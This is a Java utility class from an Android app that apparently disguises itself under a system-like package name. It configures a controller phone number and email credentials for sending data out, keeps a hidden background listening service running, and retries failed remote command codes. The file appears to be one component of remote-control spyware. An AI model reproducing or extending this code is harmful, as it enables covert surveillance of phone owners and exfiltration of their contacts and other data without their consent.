package com.android.system.controled.util;

import java.util.ArrayList;

import android.content.Context;
import android.content.Intent;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.bean.ConfigInfo;
import com.android.system.controled.db.InnerDbOpera;
import com.android.system.controled.service.ListenService;

public class InitUtil {

	private static final int MAX_OPERAS = 3;

	/**
	 * 初始化或check
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-9-9
	 */
	public static void init(Context context) {
		// initConfig(context);
		checkBackService(context);
		checkUploadedOrNot(context);
	}

	/**
	 * 读取配置信息
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-9-9
	 */
	public static void initConfig(Context context) {
		ConfigInfo config = XmlUtil.getConfigInfo(context);
		MainApplication.getInstence().setControllerTel(config.getControllerTel());
		MainApplication.getInstence().setSenderEmailAddr(config.getSenderEmailAddr());
		MainApplication.getInstence().setSenderPwd(config.getSenderPwd());
		MainApplication.getInstence().setReceiverEmailAddr(config.getReceiveEmailAddr());
	}

	/**
	 * 开启后台监听服务
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zgy
	 * @date:2012-8-30
	 */
	private static void checkBackService(Context context) {

		// ContactsUtil.createContactsFile(context);//测试

		if (!ServiceUtil.isServiceStarted(context, MainApplication.SERVICE_NAME_LISTEN)) {
			Intent i = new Intent(context, ListenService.class);
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(i);
			Debug.v("service", "service is not running, need to start service!");
		} else {
			Debug.v("service", "service is running, no need to start service!");
		}

	}

	/**
	 * 检查是否有未上传成功的记录
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-9-9
	 */
	private static void checkUploadedOrNot(Context context) {
		// 每次只执行三个未成功的命令
		ArrayList<Code> codesFailed = new ArrayList<Code>();
		codesFailed = InnerDbOpera.getInstence().getCodeFailed();
		if (codesFailed != null && codesFailed.size() > 0) {
			int i = 0;
			for (Code code : codesFailed) {

				if (i < MAX_OPERAS) {
					DoAboutCodeUtils.doOperaByMessage(context, "CODE." + code.getCode(), code);
				}

				i++;
			}
		}
	}
}
